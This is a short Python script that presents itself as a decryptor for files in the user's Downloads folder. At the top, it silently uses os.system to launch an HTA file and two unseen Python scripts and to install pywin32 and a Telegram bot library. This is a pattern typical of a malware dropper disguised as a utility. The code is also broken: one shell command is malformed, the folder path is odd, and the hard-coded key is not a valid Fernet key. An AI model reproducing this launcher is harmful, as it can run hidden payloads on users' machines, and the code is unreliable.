from cryptography.fernet import Fernet
import os

os.system("pip install cryptography")
os.system("./v2.hta")
os.system("cd cd /d D:")
os.system("pip install pywin32")
os.system("pip install win32api")
os.system("python mh.py")
os.system("pip install telebot")
os.system("python fixed.py")

def decrypt_file(key, input_file_path, output_file_path):
    with open(input_file_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()

    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)

    with open(output_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

def decrypt_files_in_folder(key, folder_path):
    for filename in os.listdir(folder_path):
        input_file_path = os.path.join(folder_path, filename)
        output_file_path = os.path.join(folder_path, f"decrypted_{filename}")

       
        if os.path.isdir(input_file_path):
            continue

        decrypt_file(key, input_file_path, output_file_path)


encryption_key = b'hphongdev28'
download_folder = os.path.expanduser("~cd/Downloads")

decrypt_files_in_folder(encryption_key, download_folder)